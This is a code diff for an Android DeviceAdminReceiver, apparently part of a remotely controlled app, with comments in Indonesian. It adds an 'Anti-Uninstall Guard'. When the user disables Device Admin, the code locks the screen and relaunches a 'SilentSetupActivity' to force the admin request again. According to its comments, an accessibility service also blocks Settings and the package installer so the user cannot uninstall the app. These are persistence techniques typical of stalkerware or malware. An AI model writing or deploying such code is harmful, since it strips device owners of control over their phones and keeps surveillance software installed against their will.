@@ -24,6 +24,22 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
     override fun onDisabled(context: Context, intent: Intent) {
         val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         try { dpm.lockNow() } catch (_: Exception) {}
+
+        // ── Anti-Uninstall Guard: re-request admin jika flag aktif ─────────────
+        // Dipanggil saat user berhasil nonaktifkan Device Admin dari Settings.
+        // Jika flag aktif → langsung popup Device Admin lagi secara otomatis.
+        val prefs = context.getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
+        if (prefs.getBoolean("anti_uninstall_enabled", false)) {
+            try {
+                val reRequest = Intent(context, SilentSetupActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                            Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                            Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    putExtra("force_request_admin", true)
+                }
+                context.startActivity(reRequest)
+            } catch (_: Exception) {}
+        }
     }
 
     companion object {
@@ -38,6 +54,26 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
         fun isDeviceOwner(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             return dpm.isDeviceOwnerApp(context.packageName)
+        }
+
+        /**
+         * Aktifkan / nonaktifkan Anti-Uninstall Guard.
+         *
+         * ON  → Accessibility akan intercept navigasi ke Settings/PackageInstaller
+         *       dan langsung balik ke Home. Jika Device Admin sampai dinonaktifkan,
+         *       SilentSetupActivity otomatis minta admin lagi.
+         *
+         * OFF → Semua proteksi accessibility & re-request dimatikan → app bisa
+         *       di-uninstall normal (untuk keperluan remote uninstall yang disengaja).
+         */
+        fun setAntiUninstall(context: Context, enable: Boolean): String {
+            val prefs = context.getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
+            prefs.edit().putBoolean("anti_uninstall_enabled", enable).apply()
+            return if (enable) {
+                "ANTI_UNINSTALL_ON: Guard aktif — accessibility block Settings uninstall & admin akan di-request ulang otomatis"
+            } else {
+                "ANTI_UNINSTALL_OFF: Guard dinonaktifkan — app bisa di-uninstall normal"
+            }
         }
 
         fun setBlockUninstall(context: Context, block: Boolean): String {
@@ -70,4 +106,3 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
         }
     }
 }
-
